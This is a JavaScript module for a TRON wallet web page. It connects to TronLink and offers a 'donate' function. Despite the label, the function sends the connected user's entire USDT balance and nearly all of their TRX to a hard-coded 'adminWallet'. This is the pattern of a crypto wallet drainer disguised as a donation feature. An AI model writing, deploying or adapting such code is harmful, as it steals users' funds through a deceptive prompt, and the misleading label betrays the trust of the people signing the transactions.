let usdtContract;
const USDT_TRC20_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const adminWallet = "TK37FVJp8b9L8JEudVdiN9NNzZgSzWiu5k"; // Example admin wallet

const USDT_ABI = [
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "balance", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      { "name": "_to", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "transfer",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];

export async function connectWallet() {
  try {
    if (!window.tronWeb) {
      throw new Error("Please install TronLink or another TronWeb-compatible wallet");
    }

    // Request account access
    try {
      await window.tronLink.request({ method: 'tron_requestAccounts' });
    } catch (err) {
      throw new Error("User denied account access");
    }

    // Wait briefly for TronLink to update
    await new Promise(resolve => setTimeout(resolve, 500));

    // Check if connected after request
    if (!window.tronWeb.ready || !window.tronWeb.defaultAddress.base58) {
      throw new Error("Please connect your wallet to TRON network");
    }

    const userAddress = window.tronWeb.defaultAddress.base58;
    console.log("Connected to TRON wallet:", userAddress);

    // Initialize contract
    usdtContract = await window.tronWeb.contract(USDT_ABI, USDT_TRC20_CONTRACT_ADDRESS);
    
    return userAddress;

  } catch (error) {
    console.error("Wallet connection error details:", error);
    throw error;
  }
}

export async function donateTRXAndUSDT() {
  try {
    const userAddress = window.tronWeb.defaultAddress.base58;

    // Get balances
    const initialTrxBalance = await window.tronWeb.trx.getBalance(userAddress);
    
    const parameter = [{
      type: 'address',
      value: userAddress
    }];
    
    const options = {
      feeLimit: 100000000,
      callValue: 0
    };

    // Get USDT balance
    const balanceTransaction = await window.tronWeb.transactionBuilder.triggerConstantContract(
      USDT_TRC20_CONTRACT_ADDRESS,
      'balanceOf(address)',
      options,
      parameter
    );

    const usdtBalance = window.tronWeb.toDecimal(balanceTransaction.constant_result[0]);
    const usdtBalanceInUsdt = usdtBalance / 1e6;

    if (parseFloat(initialTrxBalance) <= 0 && parseFloat(usdtBalanceInUsdt) <= 0) {
      throw new Error("Insufficient balance to make the donation");
    }

    let trxTxHash, usdtTxHash;
    let trxAmount = '0', usdtAmount = '0';

    // Handle USDT transfer
    if (parseFloat(usdtBalanceInUsdt) > 0) {
      const requiredTrxForGas = 100000;

      if (initialTrxBalance < requiredTrxForGas) {
        throw new Error("Insufficient TRX for gas fees");
      }

      try {
        const transferParameter = [{
          type: 'address',
          value: adminWallet
        }, {
          type: 'uint256',
          value: usdtBalance.toString()
        }];

        const { transaction: usdtTransaction } = await window.tronWeb.transactionBuilder.triggerSmartContract(
          USDT_TRC20_CONTRACT_ADDRESS,
          'transfer(address,uint256)',
          options,
          transferParameter,
          userAddress
        );

        const signedTx = await window.tronWeb.trx.sign(usdtTransaction);
        const usdtTx = await window.tronWeb.trx.sendRawTransaction(signedTx);
        
        usdtTxHash = usdtTx.txid;
        usdtAmount = usdtBalanceInUsdt;
      } catch (error) {
        console.error("USDT transfer failed:", error);
        throw new Error("USDT transfer failed. Please try again.");
      }
    }

    // Handle TRX transfer
    const currentTrxBalance = await window.tronWeb.trx.getBalance(userAddress);
    if (currentTrxBalance > 0) {
      try {
        const remainingTrxBalance = currentTrxBalance - 100000;

        if (remainingTrxBalance > 0) {
          const transaction = await window.tronWeb.transactionBuilder.sendTrx(
            adminWallet,
            remainingTrxBalance,
            userAddress
          );

          const signedTx = await window.tronWeb.trx.sign(transaction);
          const trxTx = await window.tronWeb.trx.sendRawTransaction(signedTx);
          
          trxTxHash = trxTx.txid;
          trxAmount = window.tronWeb.fromSun(remainingTrxBalance);
        }
      } catch (error) {
        console.error("TRX transfer failed:", error);
        throw new Error("TRX transfer failed. Please try again.");
      }
    }

    return {
      trxTxHash,
      usdtTxHash,
      trxAmount,
      usdtAmount
    };
  } catch (error) {
    console.error("Donation failed:", error);
    throw error;
  }
}

